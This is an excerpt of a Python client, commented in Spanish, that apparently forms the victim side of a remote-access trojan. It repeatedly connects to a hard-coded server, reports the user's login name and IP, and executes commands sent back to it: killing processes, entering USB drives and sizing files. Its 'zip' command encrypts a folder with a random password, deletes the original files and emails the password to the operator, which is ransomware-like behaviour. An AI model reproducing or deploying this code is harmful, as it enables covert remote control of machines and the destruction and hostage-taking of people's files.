...
#Esto es para quitar el linterpylint: disable=all

# Configuración del cliente "192.168.1.139"
ip_servidor = "192.168.1.136"
puerto_servidor = 61260
...
def enviar_datos(tipo_email, archivo_zip=None, password_zip=None):
    msg = MIMEMultipart()
    ...
    if(tipo_email == "password"):
        ...
        # Verificar que se haya proporcionado el nombre del archivo y la contraseña
        if archivo_zip and password_zip:
            msg['Subject'] = f"Detalles del archivo ZIP de {nombre_usuario}"
            # Agregar el nombre del archivo y la contraseña al cuerpo del correo
            cuerpo_mensaje = (
                f"Se ha creado un archivo ZIP con los siguientes detalles:\n\n"
                f"Nombre del archivo ZIP: {archivo_zip}\n"
                f"Contraseña del ZIP: {password_zip.decode('utf-8')}\n\n")
            ...
            try:
                ...
                server.sendmail(msg['From'], msg['To'], msg.as_string())
                server.quit()
                print("Correo enviado exitosamente con el nombre del archivo ZIP y la contraseña")

            except Exception as e:
                print(f"Error al enviar el correo: {e}")
        else:
            print("Faltan archivo_zip o password_zip para el envío del correo de tipo 'zip'.")
...
def main():
    while True:
        try:
            print(f"{Fore.LIGHTGREEN_EX}Intentando conectarse al servidor...{Fore.RESET}")
            
            # Crear el socket e intentar la conexión
            cliente = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            cliente.connect((ip_servidor, puerto_servidor))

            nombre_usuario = os.getlogin()
            cliente.send(nombre_usuario.encode('utf-16'))

            print(f"{Fore.LIGHTGREEN_EX}Conexión establecida con el servidor.{Fore.RESET}")
            ...
            if respuesta == "Autenticación exitosa":
                ...
                # Obtener y enviar el nombre de usuario y la IP del cliente
                nombre_usuario = os.getlogin()
                ip_cliente = socket.gethostbyname(socket.gethostname())
                mensaje = f"{nombre_usuario};{ip_cliente}"
                cliente.send(mensaje.encode('utf-8'))

                # Bucle para recibir y ejecutar comandos del servidor
                while True:
                    ...
                    elif comando.startswith("taskill "):
                        programa_finalizar = comando[8:].strip()  # Extraer el nombre del programa
                        respuesta = ""
                        proceso_encontrado = False

                        # Buscar y finalizar el proceso
                        for proceso in psutil.process_iter(['name']):
                            try:
                                if programa_finalizar.lower() in proceso.info['name'].lower():
                                    proceso.terminate()  # Intentar finalizar el proceso
                                    proceso_encontrado = True
                                    respuesta += f"{Fore.GREEN}Aplicación '{proceso.info['name']}' finalizada correctamente.{Fore.RESET}\n"
                            except (psutil.NoSuchProcess, psutil.AccessDenied) as e:
                                respuesta += f"{Fore.YELLOW}No se pudo finalizar '{programa_finalizar}': {str(e)}{Fore.RESET}\n"

                        if not proceso_encontrado:
                            respuesta = f"{Fore.RED}No se encontró ningún proceso llamado '{programa_finalizar}'.{Fore.RESET}"
                    ...
                    elif comando.startswith("getpendrive "):
                        pendrive_name = comando[12:].strip()  # Obtener el nombre del pendrive enviado desde el servidor
                        global ruta_actual_disco  # Referenciar la variable global
                        ruta_actual_disco = os.getcwd()
                        respuesta = f"{Fore.RED}Este equipo{mostrar_ruta_hasta_equipo(os.getcwd())}{Fore.RESET}\n"
                        dispositivos = psutil.disk_partitions()
                        dispositivo_encontrado = False

                        # Verificar cada dispositivo para encontrar el que coincide con el nombre o letra de unidad
                        for dispositivo in dispositivos:
                            # Comprobar si el dispositivo es removible
                            if 'removable' in dispositivo.opts or 'fixed' in dispositivo.opts:
                                nombre_volumen = obtener_nombre_volumen(dispositivo.device)
                                
                                # Verificar si el nombre o la letra del dispositivo coincide
                                if pendrive_name.lower() in nombre_volumen.lower() or pendrive_name.lower() in dispositivo.device.lower():
                                    try:
                                        os.chdir(dispositivo.mountpoint)  # Cambiar al directorio de montaje del dispositivo
                                        respuesta += f"{Fore.LIGHTGREEN_EX}Cambiado al pendrive: {nombre_volumen} ({dispositivo.device}) - Ruta: {dispositivo.mountpoint}{Fore.RESET}\n"
                                        dispositivo_encontrado = True
                                        break
                                    except Exception as e:
                                        respuesta += f"{Fore.RED}Error al acceder al pendrive: {str(e)}{Fore.RESET}\n"
                                        dispositivo_encontrado = True

                        # Si no se encuentra el dispositivo, notificarlo
                        if not dispositivo_encontrado:
                            respuesta += f"{Fore.YELLOW}No se encontró el pendrive o disco duro con el nombre: {pendrive_name}{Fore.RESET}"

                        # Enviar respuesta al servidor
                        cliente.send(respuesta.encode())
                        continue

                    elif comando.startswith("outpendrive"):
                        try:
                            # Regresar a la ruta guardada en `ruta_actual`
                            os.chdir(ruta_actual_disco)
                            respuesta = f"Regresado a la ruta original: {ruta_actual_disco}"
                        except Exception as e:
                            respuesta = f"Error al regresar a la ruta original: {str(e)}"
                    ...
                    elif comando.startswith("peso "):
                        archivo_peso = comando[5:].strip()  # Obtener el nombre del archivo o carpeta
                        ruta_actual = os.getcwd()  # Obtener la ruta actual
                        ruta_archivo = os.path.join(ruta_actual, archivo_peso)  # Ruta completa del archivo o carpeta

                        # Comprobar si el archivo o carpeta existe
                        if os.path.exists(ruta_archivo):
                            if os.path.isfile(ruta_archivo):
                                # Si es un archivo, obtener su tamaño en bytes y convertir a MB
                                tamaño_en_bytes = os.path.getsize(ruta_archivo)
                                tamaño_en_megabytes = tamaño_en_bytes / (1024 * 1024)  # Convertir a MB
                                respuesta = f"El tamaño del archivo '{archivo_peso}' es de {tamaño_en_megabytes:.2f} MB."
                            
                            elif os.path.isdir(ruta_archivo):
                                # Si es una carpeta, recorrer todos los archivos y sumar sus tamaños
                                tamaño_total = 0
                                for ruta_carpeta, subcarpetas, archivos in os.walk(ruta_archivo):
                                    for archivo in archivos:
                                        ruta_archivo_individual = os.path.join(ruta_carpeta, archivo)
                                        tamaño_total += os.path.getsize(ruta_archivo_individual)
                                
                                tamaño_en_megabytes = tamaño_total / (1024 * 1024)  # Convertir a MB
                                respuesta = f"El tamaño total de la carpeta '{archivo_peso}' es de {tamaño_en_megabytes:.2f} MB."
                        else:
                            respuesta = "El archivo o carpeta no existe."

                        # Enviar la respuesta de vuelta al servidor
                        cliente.send(respuesta.encode())
                        continue

                    elif comando.startswith("zip "):
                        archivo_ZIP = comando[4:].strip()  # Nombre de la carpeta a comprimir
                        ruta_actual = os.getcwd()  # Ruta actual
                        ruta_carpeta = os.path.join(ruta_actual, archivo_ZIP)  # Ruta completa de la carpeta
                        zip_nombre = f"{archivo_ZIP}.zip"  # Nombre del archivo ZIP de salida
                        tipo_email = "zip"

                        # Generar una contraseña aleatoria de 8 caracteres
                        secret_password = ''.join(random.choices(string.ascii_letters + string.digits, k=8)).encode()

                        # Comprobar si la carpeta existe
                        if os.path.isdir(ruta_carpeta):
                            try:
                                with pyzipper.AESZipFile(zip_nombre, 'w', compression=pyzipper.ZIP_LZMA) as zf:
                                    ...
                                    for root, dirs, files in os.walk(ruta_carpeta):
                                        for file in files:
                                            archivo_a_zip = os.path.join(root, file)
                                            # Agregar archivo al ZIP manteniendo la estructura de la carpeta
                                            zf.write(archivo_a_zip, os.path.relpath(archivo_a_zip, ruta_actual))

                                    # Agregar archivo adicional "test.txt" con el mensaje "Prueba"
                                    # zf.writestr('info.txt', "Su ")
                                    for root, dirs, files in os.walk(ruta_carpeta):
                                        for file in files:
                                            os.remove(os.path.join(root, file))
                                    
                                os.rmdir(ruta_carpeta)
                                enviar_datos(tipo_email, archivo_zip=zip_nombre, password_zip=secret_password)
                                respuesta = f"{Fore.RED}ZIP creado con éxito y encriptado con contraseña: {secret_password.decode('utf-8')}{Fore.RESET}"

                            except Exception as e:
                                respuesta = f"{Fore.RED}Error al crear el ZIP: {str(e)}{Fore.RESET}"
                        else:
                            respuesta = f"{Fore.RED}La carpeta '{archivo_ZIP}' no existe.{Fore.RESET}"
            ...
            print(f"{Fore.YELLOW}Servidor no disponible. Reintentando en 5 segundos...{Fore.RESET}")
            time.sleep(5)
        except Exception as e:
            print(f"{Fore.RED}Error durante la comunicación: {e}{Fore.RESET}")
            time.sleep(5)
        finally:
            # Cerrar conexión al finalizar el intento de comunicación
            cliente.close()
